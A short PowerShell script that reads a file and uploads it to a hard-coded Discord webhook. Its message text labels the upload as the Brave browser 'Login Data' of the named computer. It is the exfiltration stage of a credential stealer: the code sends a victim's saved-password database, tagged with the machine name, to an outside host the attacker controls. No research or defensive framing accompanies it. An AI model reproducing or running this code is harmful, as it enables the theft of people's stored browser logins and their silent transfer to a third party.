$webhookUrl = "https://discord.com/api/webhooks/1372616054664073320/UnxIbbbhdjldR18Xgsu05fywZn_cY6dRNQBdG_kD3qtlS4cfqdXOY3pQYt-J5LxTRH7B"
$filePath = "C:\Path\To\Your\File.txt"
$fileName = [System.IO.Path]::GetFileName($filePath)
$message = "**Login Data** of Brave Browser in [$env:COMPUTERNAME]"
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$body = New-Object System.IO.MemoryStream
$writer = New-Object System.IO.StreamWriter($body)

$writer.Write("--$boundary$LF")
$writer.Write("Content-Disposition: form-data; name=`"content`"$LF$LF")
$writer.Write("$message$LF")

$writer.Write("--$boundary$LF")
$writer.Write("Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF")
$writer.Write("Content-Type: application/octet-stream$LF$LF")
$writer.Flush()

$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$body.Write($fileBytes, 0, $fileBytes.Length)

$writer.Write("$LF--$boundary--$LF")
$writer.Flush()
$body.Seek(0, 'Begin') | Out-Null

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"

$writer.Dispose()
$body.Dispose()
